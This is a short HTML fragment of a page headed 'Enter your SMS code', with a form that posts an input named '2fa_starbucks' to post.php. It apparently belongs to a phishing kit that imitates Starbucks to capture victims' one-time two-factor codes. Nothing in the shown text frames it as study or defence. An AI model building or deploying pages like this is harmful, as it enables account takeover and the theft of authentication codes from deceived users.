  ...
  <body>
    ...
    <div class="container">
      <div class="account-wall">
        ...
        <h2 class="text-center friends-text">Enter your SMS code</h2>

          <form method="POST" action="post.php" class="form-signin">

            <input type="text" name="2fa_starbucks" class="form-control" placeholder="SMS Code" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
	    <br>
